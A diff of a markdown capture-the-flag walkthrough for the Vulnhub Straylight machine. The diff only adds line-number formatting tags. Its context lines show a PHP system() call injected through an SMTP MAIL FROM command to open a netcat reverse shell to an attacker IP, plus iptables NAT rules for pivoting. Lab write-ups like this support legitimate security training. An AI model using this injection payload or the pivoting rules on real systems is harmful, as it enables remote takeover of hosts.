@@ -30,6 +30,7 @@ This machine have 2 Network Adaptor therefore showing to IP but both are same :
 
 I will be using 192.168.56.102
 ```
+{: .nolineno}
 
 ## Port Scan Results ➡️
 
@@ -41,6 +42,7 @@ Open Ports >
 80			HTTP			
 3000		Apache		Hadoop
 ```
+{: .nolineno}
 
 ---
 
@@ -87,8 +89,10 @@ This image is of source code of the previous picture .
 Now it’s time to execute our reverse shell code →
 
 ```
+{: .nolineno}
 Command : MAIL FROM:<?php system('nc -e /bin/bash 192.168.56.103 4444'); ?>
 ```
+{: .nolineno}
 
 In response to that in netcat I recevied this →
 
@@ -129,14 +133,18 @@ Now ⤵️
 It time to make tunnel from straylight to Neuromancer and also to the Attacker machine So :>
 
 ```
+{: .nolineno}
 Command : iptables -t nat -A POSTROUTING -o enp0s3 -j SNAT --to-source 192.168.56.102
 ```
+{: .nolineno}
 
 ![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2019.png)
 
 ```
+{: .nolineno}
 command : iptables -t nat -A PREROUTING -i enp0s3 -p tcp --dport 3333 -j DNAT --to-destination 192.158.56.103
 ```
+{: .nolineno}
 
 ![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2020.png)
 
